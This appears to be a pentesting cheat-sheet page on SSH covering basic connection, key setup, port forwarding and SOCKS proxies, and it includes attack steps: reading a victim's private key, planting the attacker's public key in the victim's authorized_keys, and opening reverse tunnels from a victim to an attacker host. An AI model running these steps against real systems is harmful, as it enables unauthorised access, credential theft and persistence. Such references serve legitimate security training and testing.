---
title: SSH
desc: Connects remote server using Secure Shell protocol.
tags: [Linux, Pivoting, PortForwarding, PrivEsc, SSH]
alts: [Plink, Ssh-keygen, Telnet, Ufw]
website:
render_with_liquid: false
---

## Basic

```sh
# Basic
ssh username@10.0.0.1

# Without username
ssh 10.0.0.1

# If you got the error message "...no matching host key type found. Their offer: ssh-rsa",
ssh -o HostKeyAlgorithms=+ssh-rsa username@10.0.0.1


# Test the connection
ssh -T username@10.0.0.1
ssh -T username@10.0.0.1 -vvv
```

<br />

## Port Number

```sh
ssh username@10.0.0.1 -p 2200
```

<br />

## Generate SSH Keys and Set Up Public Key

```sh
# On target machine, check if an aurhotized_key exists.
ls /home/victim_user/.ssh/authorized_key

# If it exists, you might be able to connect SSH with your keys as victim_user.

# ------------------------------------------------------

# On attack mahcine,
# Generate SSH public and private keys
ssh-keygen

# Copy the content of the public key a.k.a. id_rsa.pub
cat ~/.ssh/id_rsa.pub

# -------------------------------------------------------

# Paste the content of the public key to the victim's authorized_keys
echo '<content_of_the_id_rsa.pub>' >> /home/victime_user/.ssh/authorized_keys
```

<br />

## Connect with Private Key (id_rsa)

```sh
# On target server, copy the content of id_rsa (this is a private key).
cat victim_user/.ssh/id_rsa

# --------------------------------------------------------

# On attack machine, paste it to a new file.
vim private_key.txt

# Change permissions
chmod 600 private_key.txt

# Connect using it
ssh -i private_key.txt victim_user@vulnerable.com
```

<br />

## Run Command After Connecting

```sh
ssh username@10.0.0.1 'ls -l'
```

<br />

## Port Forwarding (Tunneling)

If you have gained to connect the target SSH server, you can execute port forwarding.

```sh
# On attack machine

# -f: Background
# -N: Do not execute remote commands
ssh -L 8000:<victim-ip-for-webserver>:80 victim-user@<victim-ip-for-ssh> -fN

# Entering localhost:8000 in browser, you can access to "<victim-ip-for-webserver>:80" through <victim-ip-for-ssh>.

# To stop connection
ps aux | grep ssh
kill <PID>
```

<br />

## Proxies

```sh
# On attack machine

# -f: Background
# -N: Do not execute remote commands
ssh -D 1337 victim-user@<victim-machine-ip> -fN
```

<br />

## Reverse Connection

```sh
# On victim machine,

# Generate SSH keys and save them to "/home/victim-user/reverse-keys" (arbitrary).
ssh-keygen

ls -l /home/victim-user/reverse-keys
reverse
reverse.pub

# Copy the content of the public key (reverse.pub).
cat reverse .pub

# -------------------------------------------------------

# On attack machine,

# Add the content of the public key to authorized_key
echo '<content-of-public-key>' >> ~/.ssh/authorized_key

# To clarify that the key only for reverse connection. add the following line to this content in authorized_key.
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty id-rsa
AAAAAB3NzaC........

# Check if the SSH server on attack machine is running.
sudo systemctl status ssh

# --------------------------------------------------------

# On victim machine,

# Reverse port forwarding using the private key ("reverse" here)
ssh -R <attacker-port>:<victim-ip>:<victim-port> attacker@<attacker-ip> -i reverse -fN

# Reverse proxy
ssh -R 1337 attacker@<attacker-ip> -i reverse -fN

# ---------------------------------------------------------

# On attack machine,
# You can access to "<victim-ip>:<victim-port>"

# --------------------------------------------------------

# On victim machine,
# Close connections.
ps aux | grep ssh
sudo kill <PID>
```

<br />

## SSH Server

```sh
# Start SSH server
/etc/init.d/ssh start
# or
systemctl start ssh

# Stop ssh server
systemctl stop ssh

----------------------

# Check SSH running
ps -e | grep ssh
```